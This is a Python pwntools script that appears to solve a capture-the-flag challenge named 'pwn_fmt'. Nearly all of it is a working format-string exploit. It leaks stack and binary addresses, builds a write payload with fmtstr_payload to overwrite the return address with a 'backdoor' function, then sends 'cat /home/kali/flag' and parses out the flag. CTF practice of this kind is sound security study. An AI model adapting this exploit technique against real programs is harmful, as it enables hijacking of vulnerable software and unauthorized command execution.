from pwn import *


# def exec_fmt(payload):
#     p.sendline(payload)
#     return p.recvline()

# # hello:
# autofmt = FmtStr(exec_fmt, numbwritten=6)
# offset = autofmt.offset

name = "pwn_fmt"

def getflag():
    context.arch = "amd64"
    context.os = "linux"
    context.binary = elf = ELF("/home/kali/pwn_fmt", checksec=False)

    p = process(elf.path)
    
    var_offset = 0x1b0

    p.sendlineafter(b"input your name>>", b"%p.%7$p")
    leak_stack_addr, leak_elf_addr = p.recvline().strip().split(b":")[1].split(b".")

    elf.address = int(leak_elf_addr, 16) - 0x200f

    var_addr = int(leak_stack_addr, 16)+var_offset
    ret_addr = var_addr - 8

    print("retaddr: %x" %ret_addr)
    writes2 = {ret_addr: elf.symbols["backdoor"] & 0xffff}

    # for k, v in writes2.items():
    #     print(hex(k), hex(v))

    payload = fmtstr_payload(8, writes2)
    print(payload)

    payload = payload.replace(b'lln', b'hhn')
    print(payload)
    # payload = fmtstr_payload(8, writes2, write_size='byte')
    # print(payload)
    # payload = fmtstr_payload(8, writes2, write_size='short')
    # print(payload)
    # payload = fmtstr_payload(8, writes2, write_size='int')
    # print(payload)

    p.sendline(payload)

    # p.interactive()

    p.sendline(b"cat /home/kali/flag")

    data = p.recvline()
    flag = re.search(b"flag\{.*\}", data).group()

    p.close()
    p.kill()

    flag = flag.replace(b"flag{", b"").replace(b"}", b"")

    return flag

if __name__ == "__main__":
    print(getflag())

